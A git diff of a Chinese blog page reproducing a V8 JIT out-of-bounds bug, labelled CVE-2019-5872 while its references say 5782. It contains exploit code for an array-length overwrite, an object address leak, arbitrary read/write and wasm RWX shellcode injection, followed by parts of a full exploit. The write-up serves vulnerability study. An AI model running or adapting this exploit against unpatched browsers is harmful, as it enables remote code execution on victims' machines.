@@ -345,7 +345,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>9.1k</span>
+      <span>9.2k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -365,12 +365,14 @@
     <div class="post-body" itemprop="articleBody">
         <p>v8 引擎漏洞 CVE-2019-5872 复现，因本人对 JIT 技术的了解较浅，故本文对漏洞成因的 JIT 方面并不做详细的说明。</p>
 <span id="more"></span>
-<h2 id="环境">环境</h2>
-<p>切换到漏洞修复前的版本，进行编译：</p>
+
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>切换到漏洞修复前的版本，进行编译：</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">git</span> checkout b474b3102bd4a95eafcdb68e0e44656046132bc9
 $ gclient <span class="token function">sync</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>debug 模式调试会有点问题，所以选择 release 模式进行编译</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ ./tools/dev/v8gen.py x64.release<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
 <p>为了使用 job 等调试命令，在 <code>out.gn/x64.release/args.gn</code> 里写入下面配置：</p>
 <pre class="line-numbers language-none"><code class="language-none">is_debug &#x3D; false
 target_cpu &#x3D; &quot;x64&quot;
@@ -378,10 +380,11 @@ v8_enable_backtrace &#x3D; true
 v8_enable_disassembler &#x3D; true
 v8_enable_object_print &#x3D; true
 v8_enable_verify_heap &#x3D; true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>最后编译即可</p>
 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ ninja -C out.gn/x64.release d8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<h2 id="漏洞分析">漏洞分析</h2>
-<p>先使用官方的 Poc 进行测试：</p>
+
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先使用官方的 Poc 进行测试：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// Copyright 2018 the V8 project authors. All rights reserved.</span>
 <span class="token comment">// Use of this source code is governed by a BSD-style license that can be</span>
 <span class="token comment">// found in the LICENSE file.</span>
@@ -408,6 +411,7 @@ res <span class="token operator">=</span> <span class="token function">fun</span
 <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token function">assertEquals</span><span class="token punctuation">(</span><span class="token keyword">undefined</span><span class="token punctuation">,</span> a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>上面的 <code>assertEquals</code> 是没有定义的，稍作更改如下：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   <span class="token keyword">let</span> x <span class="token operator">=</span> arguments<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
@@ -431,22 +435,22 @@ console<span class="token punctuation">.</span><span class="token function">log<
 <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>可以看到，a2 数组的长度从 16 变成了 42(0x2a)，且从 <code>a2[16]</code> 往后的数值都不是 undefined，很明显出现了数组越界<br>
-<img src="/images/696ac724/pasted-2.png" alt="upload successful"></p>
+
+
+<p>可以看到，a2 数组的长度从 16 变成了 42(0x2a)，且从 <code>a2[16]</code> 往后的数值都不是 undefined，很明显出现了数组越界<br><img src="/images/696ac724/pasted-2.png" alt="upload successful"></p>
 <p>稍加调试，就可以发现问题出现在这里：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js">a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1.39064994160909e-309</span><span class="token punctuation">;</span>  <span class="token comment">// 0xffff00000000</span>
 a1<span class="token punctuation">[</span><span class="token punctuation">(</span>x <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">8.91238232205e-313</span><span class="token punctuation">;</span>  <span class="token comment">// 0x2a00000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p>这里造成了越界写操作，把 a2 的 length 给改写了，但实际上对数组越界写的情况是会导致数组扩容的，经过了解，这是因为 JIT 优化把越界的一些检查去掉了，导致漏洞的产生</p>
-<p>可以看看漏洞修复的 diff ：<br>
-<img src="/images/696ac724/pasted-3.png" alt="upload successful"></p>
+<p>可以看看漏洞修复的 diff ：<br><img src="/images/696ac724/pasted-3.png" alt="upload successful"></p>
 <p>修复前，函数参数的长度类型是 <code>Type::Range(0.0, Code::kMaxArguments, zone());</code></p>
 <p><code>Code::kMaxArguments</code> 的值是 65534，表示函数支持的最大参数数量是 65534，但是后来函数参数支持更多了，这里确没有更改，Poc 中使用了右移 16 位的操作符，65534 右移 16 位必定是 0，所以 JIT 认为这一计算始终是 0，于是进行了优化，把一些越界检查给去掉了，因此造成了越界读写的漏洞</p>
-<h2 id="漏洞利用">漏洞利用</h2>
-<p>只要改写 a2 的 length 字段很大的值，那么 a2 数组可以越界的范围很大，漏洞利用起来也很简单</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>只要改写 a2 的 length 字段很大的值，那么 a2 数组可以越界的范围很大，漏洞利用起来也很简单</p>
 <ol>
 <li>先利用数组越界读写泄露对象的地址</li>
 <li>再利用越界读写构造任意地址读写</li>
-<li>结合 1, 2 可以 leak 出 wasm 的 RWX 段位置，再任意写注入 shellcode</li>
+<li>结合 1, 2 可以 leak 出 wasm 的 RWX 段位置，再任意写注入 shellcode </li>
 </ol>
 <p>先仿照 Poc 将 a2 的 length 改成很大的值，如 0xffff：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token parameter">arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
@@ -467,6 +471,7 @@ a3<span class="token punctuation">.</span>length <span class="token operator">=<
 <span class="token comment">//%OptimizeFunctionOnNextCall(fun);</span>
 
 <span class="token function">fun</span><span class="token punctuation">(</span><span class="token operator">...</span>a3<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>其中的 <code>%OptimizeFunctionOnNextCall(fun)</code> 其实让 JIT 优化 <code>fun</code> 函数，其实可以用多次循环调用 <code>fun</code> 函数来替代</p>
 <p>这里为了方便后续的使用，还写了 BigInt 与 Float 类型的互相转换函数：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> fi_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -482,8 +487,14 @@ a3<span class="token punctuation">.</span>length <span class="token operator">=<
         i_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
         <span class="token keyword">return</span> f_buf<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h3 id="泄露对象地址">泄露对象地址</h3>
-<p>先定义一个对象 <code>objLeak</code>，有 <code>tag</code> 和 <code>leak</code> 属性，利用越界读，找到 <code>tag</code> 属性值 0x4567 相对于数组 a2 偏移的索引，即可得到 <code>leak</code> 属性对应的索引 <code>offset_leak</code>，再通过 <code>a2[offset_leak]</code> 即可将 <code>leak</code> 属性的 float 值读出来，只要往 <code>leak</code> 属性放入任意的对象，即可读出任意对象的地址</p>
+
+
+
+
+
+
+
+<h3 id="泄露对象地址"><a href="#泄露对象地址" class="headerlink" title="泄露对象地址"></a>泄露对象地址</h3><p>先定义一个对象 <code>objLeak</code>，有 <code>tag</code> 和 <code>leak</code> 属性，利用越界读，找到 <code>tag</code> 属性值 0x4567 相对于数组 a2 偏移的索引，即可得到 <code>leak</code> 属性对应的索引 <code>offset_leak</code>，再通过 <code>a2[offset_leak]</code> 即可将 <code>leak</code> 属性的 float 值读出来，只要往 <code>leak</code> 属性放入任意的对象，即可读出任意对象的地址</p>
 <p>代码如下：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> objLeak <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'leak'</span><span class="token operator">:</span> <span class="token number">0x1234</span><span class="token punctuation">,</span> <span class="token string">'tag'</span><span class="token operator">:</span> <span class="token number">0x4567</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> offset_leak <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
@@ -508,18 +519,17 @@ console<span class="token punctuation">.</span><span class="token function">log<
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'addressOf(objTest) = 0x'</span> <span class="token operator">+</span> <span class="token function">addressOf</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>上面还用了 <code>objTest</code> 对象来测试 <code>addressOf</code>，调试结果如下：<br>
-<img src="/images/696ac724/pasted-4.png" alt="upload successful"></p>
-<h3 id="任意地址读写">任意地址读写</h3>
-<p>任意地址读写其实也很简单，可以先定义一个 ArrayBuffer 对象，改写它的 backing_store 指针，就可以对指向的地方任意读写</p>
+
+<p>上面还用了 <code>objTest</code> 对象来测试 <code>addressOf</code>，调试结果如下：<br><img src="/images/696ac724/pasted-4.png" alt="upload successful"></p>
+<h3 id="任意地址读写"><a href="#任意地址读写" class="headerlink" title="任意地址读写"></a>任意地址读写</h3><p>任意地址读写其实也很简单，可以先定义一个 ArrayBuffer 对象，改写它的 backing_store 指针，就可以对指向的地方任意读写</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> buf2write <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0xbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buf2write<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> offset_backing_store <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
 
 <span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>buf2write<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>调试可以看到，ArrayBuffer 的 length 字段是指定的 0xbeef，用同样的方式，找到 0xbeef 即可找到对应在 a2 数组的索引，随之即可找到 backing_store 指针的位置<br>
-<img src="/images/696ac724/pasted-5.png" alt="upload successful"></p>
+
+<p>调试可以看到，ArrayBuffer 的 length 字段是指定的 0xbeef，用同样的方式，找到 0xbeef 即可找到对应在 a2 数组的索引，随之即可找到 backing_store 指针的位置<br><img src="/images/696ac724/pasted-5.png" alt="upload successful"></p>
 <p>代码如下：</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> buf2write <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">0xbeef</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> data_view <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataView</span><span class="token punctuation">(</span>buf2write<span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -553,16 +563,15 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'value = 0x'</span> <span class="token operator">+</span> <span class="token function">read64</span><span class="token punctuation">(</span><span class="token function">addressOf</span><span class="token punctuation">(</span>objTest<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x18n</span> <span class="token operator">-</span> <span class="token number">1n</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>调试测试一下，这是 ArrayBuffer 修改前：<br>
-<img src="/images/696ac724/pasted-7.png" alt="upload successful"></p>
-<p>然后看到 objTest 被改写了：<br>
-<img src="/images/696ac724/pasted-8.png" alt="upload successful"></p>
+
+<p>调试测试一下，这是 ArrayBuffer 修改前：<br><img src="/images/696ac724/pasted-7.png" alt="upload successful"></p>
+<p>然后看到 objTest 被改写了：<br><img src="/images/696ac724/pasted-8.png" alt="upload successful"></p>
 <p><img src="/images/696ac724/pasted-9.png" alt="upload successful"></p>
-<p>ArrayBuffer 也同预期那样，backing_store 指针被改写了：<br>
-<img src="/images/696ac724/pasted-10.png" alt="upload successful"></p>
-<h3 id="利用-wasm-执行-shellcode">利用 wasm 执行 shellcode</h3>
-<p>大致按照下面的路线找到 RWX 段的地址，然后注入 shellcode 就行</p>
+<p>ArrayBuffer 也同预期那样，backing_store 指针被改写了：<br><img src="/images/696ac724/pasted-10.png" alt="upload successful"></p>
+<h3 id="利用-wasm-执行-shellcode"><a href="#利用-wasm-执行-shellcode" class="headerlink" title="利用 wasm 执行 shellcode"></a>利用 wasm 执行 shellcode</h3><p>大致按照下面的路线找到 RWX 段的地址，然后注入 shellcode 就行</p>
 <pre class="line-numbers language-none"><code class="language-none">wasmInstance.exports.main -&gt; shared_info -&gt; data -&gt; instance -&gt; rwx_page<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
 <p>先构造一个 wasm 对象</p>
 <pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> wasmCode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Uint8Array</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">133</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">130</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">112</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">131</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">145</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">111</span><span class="token punctuation">,</span><span class="token number">114</span><span class="token punctuation">,</span><span class="token number">121</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">109</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">105</span><span class="token punctuation">,</span><span class="token number">110</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">138</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">132</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">128</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">65</span><span class="token punctuation">,</span><span class="token number">42</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
@@ -572,14 +581,11 @@ console<span class="token punctuation">.</span><span class="token function">log<
 
 <span class="token operator">%</span><span class="token function">DebugPrint</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token operator">%</span><span class="token function">SystemBreak</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>对象 shared_info 的地址在对象 f 的 +0x18 偏移处：<br>
-<img src="/images/696ac724/pasted-11.png" alt="upload successful"></p>
-<p>对象 data 的地址在 shared_info 的 +0x8 偏移处：<br>
-<img src="/images/696ac724/pasted-12.png" alt="upload successful"></p>
-<p>在 data 偏移 +0x10 处找到 instance 对象的地址：<br>
-<img src="/images/696ac724/pasted-13.png" alt="upload successful"></p>
-<p>在 instance+0xe8 处找到 RWX 段的地址：<br>
-<img src="/images/696ac724/pasted-14.png" alt="upload successful"></p>
+
+<p>对象 shared_info 的地址在对象 f 的 +0x18 偏移处：<br><img src="/images/696ac724/pasted-11.png" alt="upload successful"></p>
+<p>对象 data 的地址在 shared_info 的 +0x8 偏移处：<br><img src="/images/696ac724/pasted-12.png" alt="upload successful"></p>
+<p>在 data 偏移 +0x10 处找到 instance 对象的地址：<br><img src="/images/696ac724/pasted-13.png" alt="upload successful"></p>
+<p>在 instance+0xe8 处找到 RWX 段的地址：<br><img src="/images/696ac724/pasted-14.png" alt="upload successful"></p>
 <p><img src="/images/696ac724/pasted-15.png" alt="upload successful"></p>
 <p>找 RWX 段的过程也可以参照本人之前写的 <a href="/3b546c3b">starctf oob 复现</a> 的文章</p>
 <p>写入 shellcode：</p>
@@ -602,11 +608,10 @@ console<span class="token punctuation">.</span><span class="token function">log<
 <span class="token punctuation">&#125;</span>
 
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>成功弹出计算器：<br>
-<img src="/images/696ac724/pasted-16.png" alt="upload successful"></p>
+
+<p>成功弹出计算器：<br><img src="/images/696ac724/pasted-16.png" alt="upload successful"></p>
 <p>生成 shellcode 的脚本同样可以参考之前的文章 <a href="/3b546c3b">starctf oob 复现</a></p>
-<h2 id="完整-exp">完整 exp</h2>
-<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> fi_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<h2 id="完整-exp"><a href="#完整-exp" class="headerlink" title="完整 exp"></a>完整 exp</h2><pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token keyword">var</span> fi_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayBuffer</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> f_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Float64Array</span><span class="token punctuation">(</span>fi_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> i_buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BigUint64Array</span><span class="token punctuation">(</span>fi_buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
@@ -738,14 +743,15 @@ console<span class="token punctuation">.</span><span class="token function">log<
 <span class="token punctuation">&#125;</span>
 
 console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">f</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="参考">参考</h2>
-<ul>
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://gtoad.github.io/2019/09/01/V8-CVE-2019-5782/">https://gtoad.github.io/2019/09/01/V8-CVE-2019-5782/</a></li>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://bugs.chromium.org/p/chromium/issues/detail?id=906043">https://bugs.chromium.org/p/chromium/issues/detail?id=906043</a></li>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://xz.aliyun.com/t/5712">https://xz.aliyun.com/t/5712</a></li>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.sunxiaokong.xyz/2020-02-25/lzx-cve-2019-5782/">https://www.sunxiaokong.xyz/2020-02-25/lzx-cve-2019-5782/</a></li>
-<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://cy2cs.top/2020/06/24/%E8%BF%91%E6%9C%9F%E5%88%86%E6%9E%90%E7%9A%84%E4%B8%A4%E4%B8%AA-v8-%E6%BC%8F%E6%B4%9E/">https://cy2cs.top/2020/06/24/近期分析的两个-v8-漏洞/</a></li>
-<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04%5E">https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04^</a>!</li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://cy2cs.top/2020/06/24/%E8%BF%91%E6%9C%9F%E5%88%86%E6%9E%90%E7%9A%84%E4%B8%A4%E4%B8%AA-v8-%E6%BC%8F%E6%B4%9E/">https://cy2cs.top/2020/06/24/%E8%BF%91%E6%9C%9F%E5%88%86%E6%9E%90%E7%9A%84%E4%B8%A4%E4%B8%AA-v8-%E6%BC%8F%E6%B4%9E/</a></li>
+<li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04%5E">https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04%5E</a>!</li>
 <li><a target="_blank" rel="external nofollow noopener noreferrer" href="https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04">https://chromium.googlesource.com/v8/v8.git/+/deee0a87c0567f9e9bf18e1c8e2417c2f09d9b04</a></li>
 </ul>
 
@@ -839,13 +845,13 @@ console<span class="token punctuation">.</span><span class="token function">log<
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">379k</span>
+    <span title="站点总字数">380k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:45</span>
+    <span title="站点阅读时长">5:46</span>
   </span>
 </div>
 <div class="busuanzi-count">
